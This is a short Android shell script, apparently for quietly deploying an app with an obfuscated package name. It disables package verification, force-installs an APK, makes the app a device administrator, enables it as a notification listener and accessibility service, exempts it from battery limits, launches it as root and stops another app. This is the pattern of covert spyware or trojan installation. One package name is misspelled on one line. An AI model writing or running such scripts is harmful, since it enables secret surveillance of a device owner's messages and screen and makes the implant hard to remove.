settings put global package_verifier_user_consent -1
pm install -g -r  /data/local/tmp/123.apk
dumpsys deviceidle whitelist +com.adaxffsfzfada.zbsvxgsvbxhdgs
dpm set-active-admin --user current com.adaxffsfzfada.zbsvxgsvbxhdgs/com.beginhigh19.p053u
appops set com.adaxffsfzfada.zbsvxgsvbxhdgs WRITE_SETTINGS allow
settings put secure enabled_notification_listeners com.adaxffszfzfada.zbsvxgsvbxhdgs/com.beginhigh19.p025n
appops set com.adaxffsfzfada.zbsvxgsvbxhdgs SET_PROCESS_LIMIT allow
# Replace com.beginhigh19 with your app's package name
APP_PACKAGE_NAME="com.adaxffsfzfada.zbsvxgsvbxhdgs"
LISTENER_SERVICE="com.beginhigh19.p025n"

# Grant the BIND_NOTIFICATION_LISTENER_SERVICE permission
 pm grant $APP_PACKAGE_NAME android.permission.BIND_NOTIFICATION_LISTENER_SERVICE
su -c monkey -p com.adaxffsfzfada.zbsvxgsvbxhdgs -c android.intent.category.INFO 1
# Add the Notification Listener service to the enabled_notification_listeners setting
settings put secure enabled_notification_listeners \
  $(settings get secure enabled_notification_listeners | tr -d '\r\n'):$APP_PACKAGE_NAME/$LISTENER_SERVICE
settings put secure enabled_accessibility_services com.adaxffsfzfada.zbsvxgsvbxhdgs/com.beginhigh19.p023w
am force-stop com.spider.pro
